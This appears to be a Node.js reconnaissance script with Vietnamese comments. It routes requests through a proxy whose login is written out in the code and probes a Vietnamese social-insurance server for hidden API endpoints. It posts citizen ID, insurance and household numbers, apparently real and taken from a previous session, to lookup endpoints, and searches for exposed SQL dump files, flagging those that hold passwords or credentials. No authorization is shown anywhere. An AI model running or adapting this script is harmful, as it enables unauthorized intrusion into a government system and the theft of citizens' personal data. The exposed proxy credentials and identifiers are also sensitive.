const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('🗺️ SỬ DỤNG PROVINCIAL MAPPING DATA ĐỂ TEST API');
console.log('=' * 60);

// Provincial mapping từ test1.php
const provincialMapping = {
  'hanoi': { ma: '01', ten: 'Thành phố Hà Nội', ma_tra_cuu: '001' },
  'haiphong': { ma: '31', ten: 'Thành phố Hải Phòng', ma_tra_cuu: '031' },
  'hcm': { ma: '79', ten: 'Thành phố Hồ Chí Minh', ma_tra_cuu: '079' },
  'danang': { ma: '48', ten: 'Thành phố Đà Nẵng', ma_tra_cuu: '048' },
  'cantho': { ma: '92', ten: 'Thành phố Cần Thơ', ma_tra_cuu: '092' }
};

function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 15000,
    headers: {
      'User-Agent': 'VssID-Mobile-App/1.0 (Android 10; SM-G975F)',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Content-Type': 'application/json'
    }
  });
}

// Test API endpoints với provincial codes
async function testAPIWithProvincialCodes() {
  console.log('\n🔍 TEST API ENDPOINTS VỚI MÃ TỈNH CHÍNH XÁC');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  const apiEndpoints = [
    '/api/provinces',
    '/api/tinh',
    '/api/dm_tinh',
    '/api/province/list',
    '/api/lookup/province',
    '/api/search/province',
    '/mobile/api/provinces',
    '/mobile/api/tinh'
  ];
  
  // Test base API endpoints
  for (let endpoint of apiEndpoints) {
    try {
      console.log(`\n🔍 Testing: ${endpoint}`);
      const response = await client.get(baseUrl + endpoint);
      
      if (response.status === 200) {
        console.log(`   ✅ SUCCESS: ${response.data.length} chars`);
        
        // Save response
        const filename = `/workspace/docs/api_${endpoint.replace(/[\/]/g, '_')}.json`;
        fs.writeFileSync(filename, JSON.stringify(response.data, null, 2));
        console.log(`   💾 Saved: ${filename}`);
      }
      
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      console.log(`   ❌ ${endpoint}: ${status}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 500));
  }
}

// Test với mã tỉnh cụ thể
async function testWithSpecificProvinceCodes() {
  console.log('\n🎯 TEST VỚI MÃ TỈNH CỤ THỂ');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  for (let [name, data] of Object.entries(provincialMapping)) {
    console.log(`\n🏛️ Testing ${data.ten} (${data.ma_tra_cuu})`);
    
    const testEndpoints = [
      `/api/province/${data.ma}`,
      `/api/province/${data.ma_tra_cuu}`,
      `/api/tinh/${data.ma}`,
      `/api/tinh/${data.ma_tra_cuu}`,
      `/api/lookup?province=${data.ma}`,
      `/api/lookup?province=${data.ma_tra_cuu}`,
      `/api/search?ma_tinh=${data.ma}`,
      `/api/search?ma_tinh=${data.ma_tra_cuu}`,
      `/mobile/api/province?code=${data.ma}`,
      `/mobile/api/province?code=${data.ma_tra_cuu}`
    ];
    
    for (let endpoint of testEndpoints) {
      try {
        const response = await client.get(baseUrl + endpoint);
        
        if (response.status === 200 && response.data) {
          console.log(`   ✅ ${endpoint}: ${response.data.length} chars`);
          
          // Check for meaningful data
          const content = JSON.stringify(response.data).toLowerCase();
          if (content.includes('bhxh') || content.includes('user') || 
              content.includes('data') || content.includes('result')) {
            console.log(`      🎯 CONTAINS MEANINGFUL DATA!`);
            
            const filename = `/workspace/docs/province_${name}_${endpoint.replace(/[\/\?=]/g, '_')}.json`;
            fs.writeFileSync(filename, JSON.stringify(response.data, null, 2));
            console.log(`      💾 Saved: ${filename}`);
          }
        }
        
      } catch (error) {
        // Ignore errors for clean output
      }
      
      await new Promise(resolve => setTimeout(resolve, 200));
    }
  }
}

// Test POST requests với provincial data
async function testPOSTWithProvincialData() {
  console.log('\n📤 TEST POST REQUESTS VỚI PROVINCIAL DATA');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  // Test data từ user trước đó
  const testData = {
    cccd: '034087001234', // Example CCCD
    bhxh: '3116073353',   // BHXH number từ session trước
    province_code: '031', // Hải Phòng
    ma_ho: '3199384206'   // Mã hộ gia đình từ session trước
  };
  
  const postEndpoints = [
    { path: '/api/lookup', data: { cccd: testData.cccd, ma_tinh: testData.province_code } },
    { path: '/api/search', data: { bhxh_number: testData.bhxh, province: testData.province_code } },
    { path: '/api/family', data: { ma_ho: testData.ma_ho, ma_tinh: testData.province_code } },
    { path: '/api/citizen', data: { cccd: testData.cccd } },
    { path: '/api/bhxh/lookup', data: { so_bhxh: testData.bhxh } },
    { path: '/mobile/api/lookup', data: testData },
    { path: '/api/query', data: { query_type: 'bhxh', data: testData.bhxh } },
    { path: '/api/trace', data: { type: 'cccd', value: testData.cccd } }
  ];
  
  for (let endpoint of postEndpoints) {
    try {
      console.log(`\n📤 POST ${endpoint.path}`);
      console.log(`   📋 Data: ${JSON.stringify(endpoint.data)}`);
      
      const response = await client.post(baseUrl + endpoint.path, endpoint.data);
      
      if (response.status === 200) {
        console.log(`   ✅ SUCCESS: ${response.data.length} chars`);
        
        const responseData = response.data;
        if (responseData && (typeof responseData === 'object' || responseData.length > 10)) {
          console.log(`   🎯 GOT RESPONSE DATA!`);
          
          const filename = `/workspace/docs/post_${endpoint.path.replace(/[\/]/g, '_')}.json`;
          fs.writeFileSync(filename, JSON.stringify(responseData, null, 2));
          console.log(`   💾 Saved response: ${filename}`);
          
          // Preview data
          const preview = JSON.stringify(responseData).substring(0, 200);
          console.log(`   📄 Preview: ${preview}...`);
        }
      }
      
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      console.log(`   ❌ ${endpoint.path}: ${status}`);
      
      if (error.response?.data) {
        const errorData = JSON.stringify(error.response.data).substring(0, 100);
        console.log(`      📄 Error data: ${errorData}...`);
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 800));
  }
}

// Tìm kiếm thêm SQL files
async function searchForMoreSQLFiles() {
  console.log('\n🔍 TÌM KIẾM THÊM SQL FILES');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  const sqlFiles = [
    'users.sql',
    'admin.sql', 
    'config.sql',
    'database.sql',
    'schema.sql',
    'dump.sql',
    'backup.sql',
    'db.sql',
    'data.sql',
    'insert.sql',
    'create.sql',
    'test.sql',
    'dev.sql',
    'production.sql',
    'auth.sql',
    'login.sql'
  ];
  
  const foundSQLFiles = [];
  
  for (let file of sqlFiles) {
    try {
      console.log(`   🔍 ${file}`);
      const response = await client.get(`${baseUrl}/${file}`);
      
      if (response.status === 200 && response.data) {
        console.log(`   ✅ FOUND: ${file} (${response.data.length} chars)`);
        foundSQLFiles.push(file);
        
        const filename = `/workspace/docs/sql_${file.replace('.', '_')}.txt`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved: ${filename}`);
        
        // Check for sensitive content
        const content = response.data.toString().toLowerCase();
        if (content.includes('password') || content.includes('user') || 
            content.includes('admin') || content.includes('credential')) {
          console.log(`   🔑 CONTAINS SENSITIVE DATA!`);
        }
      }
      
    } catch (error) {
      // Ignore 404s
    }
    
    await new Promise(resolve => setTimeout(resolve, 300));
  }
  
  return foundSQLFiles;
}

// Main execution
async function main() {
  try {
    console.log('🚀 Bắt đầu test với provincial mapping data...');
    
    // Step 1: Test API endpoints
    await testAPIWithProvincialCodes();
    
    // Step 2: Test với mã tỉnh cụ thể
    await testWithSpecificProvinceCodes();
    
    // Step 3: Test POST requests
    await testPOSTWithProvincialData();
    
    // Step 4: Tìm thêm SQL files
    const foundSQLFiles = await searchForMoreSQLFiles();
    
    // Summary
    console.log('\n📊 FINAL SUMMARY');
    console.log('=' * 60);
    console.log(`🗺️ Tested với provincial codes từ VSS database`);
    console.log(`📁 SQL files found: ${foundSQLFiles.length}`);
    
    if (foundSQLFiles.length > 0) {
      console.log('📋 SQL files discovered:');
      foundSQLFiles.forEach(file => console.log(`   - ${file}`));
    }
    
    console.log('\n🎯 PROVINCIAL MAPPING TEST COMPLETED!');
    console.log('💡 Check /workspace/docs/ for all saved responses');
    
  } catch (error) {
    console.error('💥 Error:', error.message);
  }
}

main();